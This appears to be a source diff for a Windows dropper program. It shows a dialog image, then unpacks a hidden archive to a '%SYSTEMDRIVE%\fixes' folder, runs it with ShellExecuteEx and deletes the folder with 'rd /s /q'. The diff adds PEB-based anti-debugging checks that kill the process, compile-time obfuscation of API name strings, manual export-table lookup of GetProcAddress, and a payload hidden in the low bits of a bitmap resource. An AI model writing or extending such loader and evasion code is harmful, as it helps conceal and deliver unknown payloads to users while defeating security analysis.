@@ -6,53 +6,58 @@
 #include <windowsx.h>
 #include <winternl.h>
 #include <direct.h>
+#include <array>
 
-#include "data.h"
-#include "image.h"
 #include "swap.h"
+static char valuebytes[256];
 
-template <char c> struct enc_c{ enum{ v=(char)((swapbytes[(uint8_t)c])) }; };
-#define ec(c)  enc_c<c>::v
-#define e1(s)  ec(s[0])        ,F_1
-#define e2(s)  e1(s) ,ec( s[1]),F_2
-#define e3(s)  e2(s) ,ec( s[2]),F_3
-#define e4(s)  e3(s) ,ec( s[3]),F_4
-#define e5(s)  e4(s) ,ec( s[4]),F_5
-#define e6(s)  e5(s) ,ec( s[5]),F_6
-#define e7(s)  e6(s) ,ec( s[6]),F_7
-#define e8(s)  e7(s) ,ec( s[7]),F_8
-#define e9(s)  e8(s) ,ec( s[8]),F_9
-#define e10(s) e9(s) ,ec( s[9]),F_10
-#define e11(s) e10(s),ec(s[10]),F_11
-#define e12(s) e11(s),ec(s[11]),F_12
-#define e13(s) e12(s),ec(s[12]),F_13
-#define e14(s) e13(s),ec(s[13]),F_14
-#define e15(s) e14(s),ec(s[14]),F_15
-#define e16(s) e15(s),ec(s[15]),F_16
-#define e17(s) e16(s),ec(s[16]),F_17
-#define e18(s) e17(s),ec(s[17]),F_18
-#define e19(s) e18(s),ec(s[18]),F_19
-#define e20(s) e19(s),ec(s[19]),F_20
-#define e21(s) e20(s),ec(s[20]),F_21
-#define e22(s) e21(s),ec(s[21]),F_22
-#define e23(s) e22(s),ec(s[22]),F_23
-#define e24(s) e23(s),ec(s[23]),F_24
-#define e25(s) e24(s),ec(s[24]),F_25
-#define e26(s) e25(s),ec(s[25]),F_26
-#define e27(s) e26(s),ec(s[26]),F_27
-#define e28(s) e27(s),ec(s[27]),F_28
-#define e29(s) e28(s),ec(s[28]),F_29
-#define e30(s) e29(s),ec(s[29]),F_30
-#define e31(s) e30(s),ec(s[30]),F_31
-#define e32(s) e31(s),ec(s[31]),F_32
-#define e33(s) e32(s),ec(s[32]),F_33
-#define e34(s) e33(s),ec(s[33]),F_34
-#define e35(s) e34(s),ec(s[34]),F_35
-#define e36(s) e35(s),ec(s[35]),F_36
-#define e37(s) e36(s),ec(s[36]),F_37
-#define _(s,i) {e##i(s),ec(0)  ,F_0}
+#define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
+#define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
+template <char c> struct enc_a{ enum{ v=(char)low_byte( swapbytes[(uint8_t)c]) }; };
+template <char c> struct enc_b{ enum{ v=(char)high_byte(swapbytes[(uint8_t)c]) }; };
+#define eca(c)  enc_a<c>::v
+#define ecb(c)  enc_b<c>::v
+#define e1(s)  eca(s[0])        ,ecb( s[0])
+#define e2(s)  e1(s) ,eca( s[1]),ecb( s[1])
+#define e3(s)  e2(s) ,eca( s[2]),ecb( s[2])
+#define e4(s)  e3(s) ,eca( s[3]),ecb( s[3])
+#define e5(s)  e4(s) ,eca( s[4]),ecb( s[4])
+#define e6(s)  e5(s) ,eca( s[5]),ecb( s[5])
+#define e7(s)  e6(s) ,eca( s[6]),ecb( s[6])
+#define e8(s)  e7(s) ,eca( s[7]),ecb( s[7])
+#define e9(s)  e8(s) ,eca( s[8]),ecb( s[8])
+#define e10(s) e9(s) ,eca( s[9]),ecb( s[9])
+#define e11(s) e10(s),eca(s[10]),ecb(s[10])
+#define e12(s) e11(s),eca(s[11]),ecb(s[11])
+#define e13(s) e12(s),eca(s[12]),ecb(s[12])
+#define e14(s) e13(s),eca(s[13]),ecb(s[13])
+#define e15(s) e14(s),eca(s[14]),ecb(s[14])
+#define e16(s) e15(s),eca(s[15]),ecb(s[15])
+#define e17(s) e16(s),eca(s[16]),ecb(s[16])
+#define e18(s) e17(s),eca(s[17]),ecb(s[17])
+#define e19(s) e18(s),eca(s[18]),ecb(s[18])
+#define e20(s) e19(s),eca(s[19]),ecb(s[19])
+#define e21(s) e20(s),eca(s[20]),ecb(s[20])
+#define e22(s) e21(s),eca(s[21]),ecb(s[21])
+#define e23(s) e22(s),eca(s[22]),ecb(s[22])
+#define e24(s) e23(s),eca(s[23]),ecb(s[23])
+#define e25(s) e24(s),eca(s[24]),ecb(s[24])
+#define e26(s) e25(s),eca(s[25]),ecb(s[25])
+#define e27(s) e26(s),eca(s[26]),ecb(s[26])
+#define e28(s) e27(s),eca(s[27]),ecb(s[27])
+#define e29(s) e28(s),eca(s[28]),ecb(s[28])
+#define e30(s) e29(s),eca(s[29]),ecb(s[29])
+#define e31(s) e30(s),eca(s[30]),ecb(s[30])
+#define e32(s) e31(s),eca(s[31]),ecb(s[31])
+#define e33(s) e32(s),eca(s[32]),ecb(s[32])
+#define _(s,i) {e##i(s),eca(0)  ,ecb(0), 0}
+#define merge_bytes(lb,hb) ((lb-97)|((hb-97)<<4))
 void __(const char *s,unsigned short l){
-    for(uint8_t i=0;i<l*2+1;i+=2) ((char *)s)[i>>1]=valuebytes[(uint8_t)s[i]];
+  uint8_t j=0;
+  for(uint8_t i=0;i<l+1;i++){
+    ((char *)s)[i]=valuebytes[merge_bytes(((char *)s)[j],((char *)s)[j+1])];
+    j+=2;
+  };
 }
 #define _s(n,s,l) const char n[]=_(s,l);__(n,l);
 
@@ -86,50 +91,24 @@ typedef BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL);
 AWR awr;
 typedef HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT);
 BEP bep;
-typedef HWND (WINAPI *CWEA)(DWORD,LPCSTR,LPCSTR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
-CWEA cwea;
-typedef LRESULT (WINAPI *DWPA)(HWND,UINT,WPARAM,LPARAM);
-DWPA dwpa;
-typedef BOOL (WINAPI *DWI)(HWND);
-DWI dwi;
-typedef LRESULT (WINAPI *DMA)(const MSG *);
-DMA dma;
 typedef BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *);
 EPA epa;
 typedef BOOL (WINAPI *GCR)(HWND,LPRECT);
 GCR gcr;
 typedef HDC (WINAPI *GDC)(HWND);
 GDC gdc;
-typedef BOOL (WINAPI *GMA)(LPMSG,HWND,UINT,UINT);
-GMA gma;
 typedef int (WINAPI *GSM)(int);
 GSM gsm;
 typedef BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL);
 IVR ivr;
-typedef HCURSOR (WINAPI *LCA)(HINSTANCE,LPCSTR);
-LCA lca;
-typedef HICON (WINAPI *LIA)(HINSTANCE,LPCSTR);
-LIA lia;
-typedef void (WINAPI *PQM)(int);
-PQM pqm;
 typedef BOOL (WINAPI *PIR)(const RECT *,POINT);
 PIR pir;
-typedef ATOM (WINAPI *RCA)(const WNDCLASSA *);
-RCA rca;
 typedef BOOL (WINAPI *RCP)();
 RCP rcp;
 typedef int (WINAPI *RDC)(HWND,HDC);
 RDC rdc;
-typedef LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM);
-SMA sma;
-typedef BOOL (WINAPI *SWW)(HWND,int);
-SWW sww;
 typedef BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT);
 TMV tmv;
-typedef BOOL (WINAPI *TMS)(const MSG *);
-TMS tms;
-typedef BOOL (WINAPI *UCA)(LPCSTR,HINSTANCE);
-UCA uca;
 typedef BOOL (WINAPI *UWI)(HWND);
 UWI uwi;
 typedef BOOL (WINAPI *FLIB)(HMODULE);
@@ -140,8 +119,12 @@ typedef BOOL (WINAPI *VVIA)(LPOSVERSIONINFOEXA,DWORD,DWORDLONG);
 VVIA vvia;
 typedef FARPROC (WINAPI *GPA)(HMODULE,LPCSTR);
 GPA gpa;
-typedef VOID (WINAPI *EXP)(UINT);
-EXP exp;
+typedef VOID (WINAPI *EXPW)(UINT);
+EXPW expw;
+typedef UINT (WINAPI *RWMA)(LPCSTR);
+RWMA rwma;
+typedef LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM);
+SMA sma;
 
 typedef int (__cdecl *_access_t)(const char *,int);
 _access_t _access_p;
@@ -163,16 +146,35 @@ typedef void (__cdecl *free_t)(void *);
 free_t free_p;
 typedef void *(__cdecl *calloc_t)(size_t,size_t);
 calloc_t calloc_p;
+/*
+uint32_t __readfsdword(const uint32_t Offset){
+    uint32_t value;
+    __asm__ __volatile__("movl %%fs:%a[Offset], %k[value]" : [value] "=r" (value) : [Offset] "ir" (Offset));
+    return value;
+};
+*/
+inline void dbg(){
+  DWORD pNtGlobalFlag=0;
+  PPEB pPeb=(PPEB)__readfsdword(0x30);
+  pNtGlobalFlag=*(PDWORD)((PBYTE)pPeb+0x68);
+
+  PUINT32 pProcessHeap=(PUINT32)((PBYTE)pPeb+0x18);
+  PUINT32 pFlags=(PUINT32)(*pProcessHeap+0x40);
+  PUINT32 pForceFlags=(PUINT32)(*pProcessHeap+0x44);
+
+  if((pNtGlobalFlag&0x70)||(*pFlags&~HEAP_GROWABLE)||*pForceFlags) expw(1);
+  return;
+};
 
 template <typename T> void get_fn_ptr(T* &p,HINSTANCE l,const char *f){
   if(l){
     p=(T*)gpa(l,f);
-    if(!p) exp(1);
+    if(!p) expw(1);
     char *c=(char *)f;
     while(*c) *c++=0;
     return;
   };
-  exp(1);
+  expw(1);
 };
 
 HBITMAP hBitmap,hOldBitmap;
@@ -187,9 +189,12 @@ BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
 TRACKMOUSEEVENT tme;
 int dlg_ret=0;
 bool inv=false;
+uint8_t read_shift=0;
+uint8_t *res;
 uint8_t *image;
 
 LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
+  dbg();
   switch(msg){
     case WM_CREATE:
       hBitmap=cbmp(506,191,1,32,image);
@@ -202,13 +207,13 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
       return 0;
     case WM_KEYDOWN:
       if(wParam==VK_ESCAPE||wParam=='N'||wParam=='n'){
-        dwi(hWnd);
+        DestroyWindow(hWnd);
         return 0;
       }
       else{
         if(wParam=='Y'||wParam=='y'){
           dlg_ret=1;
-          dwi(hWnd);
+          DestroyWindow(hWnd);
           return 0;
         };
       };
@@ -220,11 +225,11 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
       mpos.y=HIWORD(lParam);
       if(pir(&rc_yes,mpos)){
         dlg_ret=1;
-        dwi(hWnd);
+        DestroyWindow(hWnd);
         return 0;
       };
       if(pir(&rc_no,mpos)){
-        dwi(hWnd);
+        DestroyWindow(hWnd);
         return 0;
       };
       break;
@@ -304,30 +309,31 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
       epa(hWnd,&ps);
       break;
     case WM_DESTROY:
-      pqm(0);
+      PostQuitMessage(0);
       ddc(hdcMem);
       dob(hBitmap);
       dob(hOldBitmap);
       break;
   }
-  return dwpa(hWnd,msg,wParam,lParam);
+  return DefWindowProcA(hWnd,msg,wParam,lParam);
 }
 
 int dlg_window(HINSTANCE hInstance){
+  dbg();
   hI=hInstance;
   WNDCLASS wc;
   wc.style=0;
   wc.lpfnWndProc=dlg_wndproc;
   wc.hInstance=hInstance;
-  wc.hIcon=lia(NULL,IDI_APPLICATION);
-  wc.hCursor=lca(NULL,IDC_ARROW);
+  wc.hIcon=LoadIconA(NULL,IDI_APPLICATION);
+  wc.hCursor=LoadCursorA(NULL,IDC_ARROW);
   wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
   _s(idc,"imgdlgclass",11);
   wc.lpszClassName=idc;
   wc.lpszMenuName=NULL;
   wc.cbClsExtra=0;
   wc.cbWndExtra=0;
-  rca(&wc);
+  RegisterClassA(&wc);
   rc={0,0,506,191};
   rc_yes={19,104,234,175};
   rc_no={272,104,487,175};
@@ -341,25 +347,30 @@ int dlg_window(HINSTANCE hInstance){
   tme.cbSize=sizeof(tme);
   tme.dwFlags=TME_HOVER|TME_LEAVE;
   tme.dwHoverTime=10;
-  HWND hWnd=cwea(WS_EX_COMPOSITED|WS_EX_TOOLWINDOW|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_CAPTION|WS_SYSMENU,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
+  HWND hWnd=CreateWindowExA(WS_EX_COMPOSITED|WS_EX_TOOLWINDOW|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_CAPTION|WS_SYSMENU,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
+  if(!hWnd){
+     UnregisterClassA(wc.lpszClassName,hInstance);
+     return 0;
+  };
   tme.hwndTrack=hWnd;
-  sww(hWnd,SW_SHOW);
+  ShowWindow(hWnd,SW_SHOW);
   uwi(hWnd);
   MSG msg;
-  while(gma(&msg,NULL,0,0)){
-    dma(&msg);
-    tms(&msg);
+  while(GetMessageA(&msg,NULL,0,0)){
+    DispatchMessageA(&msg);
+    TranslateMessage(&msg);
   };
-  uca(wc.lpszClassName, hInstance);
+  UnregisterClassA(wc.lpszClassName, hInstance);
   return 0;
 }
 
 UINT null_msg;;
 
 LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
+  dbg();
   switch(msg){
     case WM_CREATE:
-      SendMessageA(hWnd,null_msg,0,0);
+      sma(hWnd,null_msg,0,0);
       return 0;
     case WM_CLOSE:
     case WM_DESTROY:
@@ -377,7 +388,7 @@ LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
 };
 
 void null_window(HINSTANCE hInstance){
-  SetLastError(0);
+  dbg();
   MSG msg;
   WNDCLASS wc;
   HWND hwnd;
@@ -389,17 +400,17 @@ void null_window(HINSTANCE hInstance){
   wc.lpszMenuName=NULL;
   _s(clsn,"main",4);
   wc.lpszClassName=clsn;
-  null_msg=RegisterWindowMessageA(wc.lpszClassName);
-  if(!RegisterClass(&wc)) return;
+  null_msg=rwma(wc.lpszClassName);
+  if(!RegisterClassA(&wc)) return;
   hwnd=CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,0,0,hInstance,0);
   if(!hwnd){
-     UnregisterClass(wc.lpszClassName,hInstance);
+     UnregisterClassA(wc.lpszClassName,hInstance);
      return;
   };
-  while(GetMessage(&msg,NULL,0,0)>0){
-    DispatchMessage(&msg);
+  while(GetMessageA(&msg,NULL,0,0)>0){
+    DispatchMessageA(&msg);
   };
-  UnregisterClass(wc.lpszClassName,hInstance);
+  UnregisterClassA(wc.lpszClassName,hInstance);
   return;
 };
 
@@ -430,6 +441,7 @@ uint32_t dsize;
 uint8_t *pdata;
 
 uint8_t dgetc(){
+  dbg();
   uint8_t s=0;
   if(dptr<dsize){
     s=pdata[dptr];
@@ -578,7 +590,6 @@ void unarc(char *out){
   FILE *o;
   uint32_t fl=0,i;
   char *t=(char *)&fl,fp[257];
-  init_unpack(data,data_size);
   for(;;){
     if(read_packed_value(t,sizeof(uint32_t))) break;
     if(dptr==dsize) break;
@@ -612,6 +623,31 @@ bool iswin10(){
   return vvia(&osvi,VER_MAJORVERSION|VER_MINORVERSION|VER_SERVICEPACKMAJOR,dwlConditionMask)!=FALSE;
 };
 
+namespace obfs {
+	template <typename Indexes> class MetaString;
+	template <size_t... I> class MetaString<std::index_sequence<I...>> {
+    public:
+      constexpr MetaString(char const *str)
+        : encrypted_buffer{ encrypt(str[I])... } {};
+    public:
+      inline const char* decrypt(void){
+        for (size_t i=0;i<sizeof...(I);i++){
+          buffer[i]=decrypt(encrypted_buffer[i]);
+        };
+        buffer[sizeof...(I)]=0;
+        return buffer;
+      }
+    private:
+      constexpr int  encrypt(char c) const { return (c+0xa)^F_0; } ;
+      constexpr char decrypt(int c) const {  return (c^F_0)-0xa; } ;
+    private:
+      char buffer[sizeof...(I) + 1] {};
+      int  encrypted_buffer[sizeof...(I)] {};
+	};
+};
+
+#define o(str) (obfs::MetaString<std::make_index_sequence<sizeof(str)>>(str).decrypt())
+
 void gpa_kernel(){
   __asm__ volatile(
     "xor (%0),      %0\n\t"
@@ -637,11 +673,11 @@ void gpa_kernel(){
   eatFunctions=(DWORD*)(moduleBase+eatDirectory->AddressOfFunctions);
   eatOrdinals=(WORD*)(moduleBase+eatDirectory->AddressOfNameOrdinals);
   eatNames=(DWORD*)(moduleBase+eatDirectory->AddressOfNames);
-  _s(kern_gpa,"GetProcAddress",14);
+  char *kern_gpa=(char *)o("GetProcAddress");
   for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
     eatNameOffset=eatNames[i];
     char *src=(char*)(moduleBase+eatNameOffset);
-    char *dst=(char*)kern_gpa;
+    char *dst=kern_gpa;
     while(*src && *dst){
       if(*src!=*dst) break;
       src++;
@@ -649,26 +685,64 @@ void gpa_kernel(){
     };
     if(*src==0 && *dst==0) gpa=(GPA)(moduleBase+eatFunctions[eatOrdinals[i]]);
   };
-  char *c=(char *)kern_gpa;
-  while(*c) *c++=0;
-  _s(expn,"ExitProcess",11);
+  kern_gpa=(char *)o("ExitProcess");
   for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
     eatNameOffset=eatNames[i];
     char *src=(char*)(moduleBase+eatNameOffset);
-    char *dst=(char*)expn;
+    char *dst=kern_gpa;
     while(*src && *dst){
       if(*src!=*dst) break;
       src++;
       dst++;
     };
-    if(*src==0 && *dst==0) exp=(EXP)(moduleBase+eatFunctions[eatOrdinals[i]]);
+    if(*src==0 && *dst==0) expw=(EXPW)(moduleBase+eatFunctions[eatOrdinals[i]]);
   };
-  c=(char *)expn;
-  while(*c) *c++=0;
+};
+
+#define data_res 0x10
+#define image_size 386584
+
+inline uint8_t *load_res(uint32_t id){
+  HRSRC res=FindResourceA(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
+  if(res){
+    HGLOBAL res_handle=LoadResource(NULL,res);
+    if(res_handle){
+      return (uint8_t*)LockResource(res_handle);
+    };
+    return NULL;
+  };
+  return NULL;
+};
+
+inline uint8_t bytes2byte(){
+  uint8_t b=0;
+  b|=(*res&0x03); b<<=2; res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  b|=(*res&0x03); b<<=2; res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  b|=(*res&0x03); b<<=2; res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  b|=(*res&0x03); res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  return b;
+};
+
+inline void bytes2uint(uint32_t &b){
+  b=0;
+  b|=bytes2byte(); b<<=8;
+  b|=bytes2byte(); b<<=8;
+  b|=bytes2byte(); b<<=8;
+  b|=bytes2byte();
 };
 
 void init(){
   gpa_kernel();
+  res=(uint8_t *)(load_res(data_res)+54);
+  if(res==NULL) expw(1);
+  uint32_t c=0;
+  bytes2uint(c);
+  for(uint16_t i=0;i<c;i++) valuebytes[i]=bytes2byte();
+  dbg();
   _s(dll_u,"User32",6);
   _s(dll_m,"msvcrt",6);
   _s(dll_s,"Shell32",7);
@@ -697,40 +771,29 @@ void init(){
   _s(f0021,"MoveToEx",8);
   _s(f0022,"AdjustWindowRect",16);
   _s(f0023,"BeginPaint",10);
-  _s(f0024,"CreateWindowExA",15);
-  _s(f0025,"DefWindowProcA",14);
-  _s(f0026,"DestroyWindow",13);
-  _s(f0027,"DispatchMessageA",16);
-  _s(f0028,"EndPaint",8);
-  _s(f0029,"GetClientRect",13);
-  _s(f0030,"GetDC",5);
-  _s(f0031,"GetMessageA",11);
-  _s(f0032,"GetSystemMetrics",16);
-  _s(f0033,"InvalidateRect",14);
-  _s(f0034,"LoadCursorA",11);
-  _s(f0035,"LoadIconA",9);
-  _s(f0036,"PostQuitMessage",15);
-  _s(f0037,"PtInRect",8);
-  _s(f0038,"RegisterClassA",14);
-  _s(f0039,"ReleaseCapture",14);
-  _s(f0040,"ReleaseDC",9);
-  _s(f0041,"SendMessageA",12);
-  _s(f0042,"ShowWindow",10);
-  _s(f0043,"TrackMouseEvent",15);
-  _s(f0044,"TranslateMessage",16);
-  _s(f0045,"UnregisterClassA",16);
-  _s(f0046,"UpdateWindow",12);
-  _s(f0047,"LoadLibraryA",12);
-  _s(f0048,"VerSetConditionMask",19);
-  _s(f0049,"VerifyVersionInfoA",18);
+  _s(f0024,"EndPaint",8);
+  _s(f0025,"GetClientRect",13);
+  _s(f0026,"GetDC",5);
+  _s(f0027,"GetSystemMetrics",16);
+  _s(f0028,"InvalidateRect",14);
+  _s(f0029,"PtInRect",8);
+  _s(f0030,"ReleaseCapture",14);
+  _s(f0031,"ReleaseDC",9);
+  _s(f0032,"TrackMouseEvent",15);
+  _s(f0033,"UpdateWindow",12);
+  _s(f0034,"LoadLibraryA",12);
+  _s(f0035,"VerSetConditionMask",19);
+  _s(f0036,"VerifyVersionInfoA",18);
+  _s(f0037,"RegisterWindowMessageA",22);
+  _s(f0038,"SendMessageA",12);
   get_fn_ptr(flib,hkernel32,f0016);
-  get_fn_ptr(lla,hkernel32,f0047);
+  get_fn_ptr(lla,hkernel32,f0034);
   hmsvcrt=lla(dll_m);
   huser32=lla(dll_u);
   hgdi32=lla(dll_g);
   hshell32=lla(dll_s);
-  get_fn_ptr(vscm,hkernel32,f0048);
-  get_fn_ptr(vvia,hkernel32,f0049);
+  get_fn_ptr(vscm,hkernel32,f0035);
+  get_fn_ptr(vvia,hkernel32,f0036);
   get_fn_ptr(_access_p,hmsvcrt,f0000);
   get_fn_ptr(_mkdir_p,hmsvcrt,f0001);
   get_fn_ptr(fclose_p,hmsvcrt,f0002);
@@ -743,29 +806,18 @@ void init(){
   get_fn_ptr(calloc_p,hmsvcrt,f0009);
   get_fn_ptr(awr,huser32,f0022);
   get_fn_ptr(bep,huser32,f0023);
-  get_fn_ptr(cwea,huser32,f0024);
-  get_fn_ptr(dwpa,huser32,f0025);
-  get_fn_ptr(dwi,huser32,f0026);
-  get_fn_ptr(dma,huser32,f0027);
-  get_fn_ptr(epa,huser32,f0028);
-  get_fn_ptr(gcr,huser32,f0029);
-  get_fn_ptr(gdc,huser32,f0030);
-  get_fn_ptr(gma,huser32,f0031);
-  get_fn_ptr(gsm,huser32,f0032);
-  get_fn_ptr(ivr,huser32,f0033);
-  get_fn_ptr(lca,huser32,f0034);
-  get_fn_ptr(lia,huser32,f0035);
-  get_fn_ptr(pqm,huser32,f0036);
-  get_fn_ptr(pir,huser32,f0037);
-  get_fn_ptr(rca,huser32,f0038);
-  get_fn_ptr(rcp,huser32,f0039);
-  get_fn_ptr(rdc,huser32,f0040);
-  get_fn_ptr(sma,huser32,f0041);
-  get_fn_ptr(sww,huser32,f0042);
-  get_fn_ptr(tmv,huser32,f0043);
-  get_fn_ptr(tms,huser32,f0044);
-  get_fn_ptr(uca,huser32,f0045);
-  get_fn_ptr(uwi,huser32,f0046);
+  get_fn_ptr(epa,huser32,f0024);
+  get_fn_ptr(gcr,huser32,f0025);
+  get_fn_ptr(gdc,huser32,f0026);
+  get_fn_ptr(gsm,huser32,f0027);
+  get_fn_ptr(ivr,huser32,f0028);
+  get_fn_ptr(pir,huser32,f0029);
+  get_fn_ptr(rcp,huser32,f0030);
+  get_fn_ptr(rdc,huser32,f0031);
+  get_fn_ptr(tmv,huser32,f0032);
+  get_fn_ptr(uwi,huser32,f0033);
+  get_fn_ptr(rwma,huser32,f0037);
+  get_fn_ptr(sma,huser32,f0038);
   get_fn_ptr(cbmp,hgdi32,f0010);
   get_fn_ptr(cdc,hgdi32,f0011);
   get_fn_ptr(ddc,hgdi32,f0012);
@@ -777,19 +829,26 @@ void init(){
   get_fn_ptr(lto,hgdi32,f0020);
   get_fn_ptr(mte,hgdi32,f0021);
   get_fn_ptr(sea,hshell32,f0015);
-  if (!iswin10()) exp(0);
+  if (!iswin10()) expw(0);
 };
 
 INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,INT nCmdShow){
   init();
   image=(uint8_t*)calloc_p(image_size,1);
   if(image){
-    init_unpack(packed_image,image_data_size);
-    for(uint32_t i=0;i<image_size;i++){
-      if(unpack_file()) break;
-      image[i]=(uint8_t)symbol;
-      if(dptr==dsize) break;
-    };
+    uint32_t res_size=0;
+    bytes2uint(res_size);
+    uint8_t *packed=(uint8_t *)calloc_p(res_size,1);
+    if(packed){
+      for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
+      init_unpack(packed,res_size);
+      for(uint32_t i=0;i<image_size;i++){
+        if(unpack_file()) break;
+        image[i]=(uint8_t)symbol;
+        if(dptr==dsize) break;
+      };
+      free_p(packed);
+    } else expw(1);
     null_window(0);
     if(dlg_ret){
       _s(drv_e,"SYSTEMDRIVE",11);
@@ -800,22 +859,29 @@ INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,IN
       _s(sea_r,"/c rd /s /q %SYSTEMDRIVE%\\fixes",31);
       char path[257];
       sprintf_p(path,mas_a,getenv_p(drv_e));
-      unarc(path);
-      SHELLEXECUTEINFO ShExecInfo;
-      ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
-      ShExecInfo.fMask=0;
-      ShExecInfo.hwnd=NULL;
-      ShExecInfo.lpVerb=sea_m;
-      ShExecInfo.lpFile=sea_c;
-      ShExecInfo.lpParameters=sea_o;
-      ShExecInfo.lpDirectory=NULL;
-      ShExecInfo.nShow=0;
-      ShExecInfo.hInstApp=0;
-      if(sea(&ShExecInfo)==FALSE){
-        ShExecInfo.lpVerb=NULL;
-        ShExecInfo.lpParameters=sea_r;
-        sea(&ShExecInfo);
-      };
+      bytes2uint(res_size);
+      uint8_t *packed=(uint8_t *)calloc_p(res_size,1);
+      if(packed){
+        for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
+        init_unpack(packed,res_size);
+        unarc(path);
+        SHELLEXECUTEINFO ShExecInfo;
+        ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
+        ShExecInfo.fMask=0;
+        ShExecInfo.hwnd=NULL;
+        ShExecInfo.lpVerb=sea_m;
+        ShExecInfo.lpFile=sea_c;
+        ShExecInfo.lpParameters=sea_o;
+        ShExecInfo.lpDirectory=NULL;
+        ShExecInfo.nShow=0;
+        ShExecInfo.hInstApp=0;
+        if(sea(&ShExecInfo)==FALSE){
+          ShExecInfo.lpVerb=NULL;
+          ShExecInfo.lpParameters=sea_r;
+          sea(&ShExecInfo);
+        };
+        free_p(packed);
+      } else expw(1);
     };
     free_p(image);
   };
